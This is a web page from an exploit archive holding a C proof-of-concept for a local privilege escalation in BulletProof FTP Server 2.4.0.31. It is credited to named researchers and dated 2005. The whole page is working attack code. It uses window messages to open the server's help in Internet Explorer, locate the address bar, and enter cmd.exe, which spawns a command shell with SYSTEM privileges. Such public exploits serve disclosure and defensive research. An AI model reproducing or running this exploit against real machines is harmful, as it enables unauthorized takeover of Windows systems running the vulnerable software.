<html><head><title>BulletProof FTP Server 2.4.0.31 Local Privilege Escalation Exploit</title></head><pre>//******************************************************************************
//Privilege escalation in BulletProof FTP Server v2.4.0.31
//By Jerome Athias
//jerome DOT athias AT free DOT fr
//Discovered by Reed Arvin reedarvin[at]gmail[dot]com
//(http://reedarvin.thearvins.com)
//
//Little PoC
//Gives you a shell with system privileges
//******************************************************************************

#include &quot;stdio.h&quot;
#include &quot;windows.h&quot;

int main(int argc, char* argv[])
{
HWND lHandle, lHandle2;
char sText[]=&quot;%windir%\\system32\\cmd.exe&quot;;
char buffer[256];

lHandle=FindWindow(NULL, &quot;BulletProof FTP Server v2.4.0.31&quot;);
if (!lHandle)
{
       printf(&quot;\nUsage :\nBulletProof FTP Server v2.4.0.31 doesn't seem to run?\n&quot;);
       return 0;
}
else
{
       printf(&quot;handle for BulletProof : 0x%X\n&quot;,lHandle);
}
SetForegroundWindow(lHandle);

SendMessage(lHandle, WM_IME_KEYDOWN, VK_F1, 0); //send F1 key &quot;help me please!&quot;
Sleep(5000);   //I need this time to drink a beer ;P

//Find the browser Handle
//lHandle2=FindWindow(NULL, &quot;BPFTP Server - Mozilla Firefox&quot;);
//if (!lHandle2)
//{
       lHandle2=FindWindow(&quot;IEFrame&quot;, &quot;BPFTP Server - Microsoft Internet Explorer&quot;);
       lHandle2=FindWindowEx(NULL, NULL, &quot;IEFrame&quot;, NULL);

       printf(&quot;handle for IE : 0x%X\n&quot;,lHandle2);
       if (!lHandle2)
       {
               printf(&quot;\nError while finding the browser's window.\n&quot;);
       }
//}
//else
//{
//        printf(&quot;handle for Firefox : 0x%X\n&quot;,lHandle2);
//}
SetForegroundWindow(lHandle2);

lHandle=FindWindowEx(lHandle2, 0, &quot;WorkerW&quot;, 0);
if (lHandle&gt;=0)
{
       lHandle = FindWindowEx(lHandle, 0, &quot;ReBarWindow32&quot;, 0);
       if (lHandle&gt;=0)
       {
               //Where are you Charlie...
             lHandle = FindWindowEx(lHandle, 0, &quot;ComboBoxEx32&quot;, 0);
             lHandle = FindWindowEx(lHandle, 0, &quot;ComboBox&quot;, 0);
             lHandle = FindWindowEx(lHandle, 0, &quot;Edit&quot;, 0);
       }
}
else
{
       printf(&quot;\nerror :-(\n&quot;);
}

SendMessage(lHandle, WM_SETFOCUS, 0, 0);
Sleep(300);
SendMessage(lHandle, WM_SETTEXT, 0, (LPARAM) sText);
//Shatter!
PostMessage(lHandle, WM_KEYDOWN, VK_RETURN, 0);
//whoami? :-)

return 0;
}

// milw0rm.com [2005-04-29]</pre></html>